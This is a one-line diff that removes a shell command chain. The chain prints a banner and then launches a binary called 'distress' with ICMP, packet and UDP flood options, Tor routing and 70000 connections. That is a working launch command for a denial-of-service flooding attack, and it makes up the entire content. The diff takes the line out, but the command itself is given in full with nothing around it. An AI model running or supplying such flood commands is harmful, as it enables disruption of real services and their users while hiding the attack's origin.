@@ -1,1 +1,0 @@
-cd ds && cat ita.txt && sleep 2s && echo user - Dubna-48㉿ && sleep 2s && echo starting module - Distress v0.7.21 && echo ------------------------------------------ && sleep 3s && ./distress_x86_64-unknown-linux-musl --user-id=1473231416 --use-my-ip 10 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --disable-auto-update --use-tor 4 -c 70000
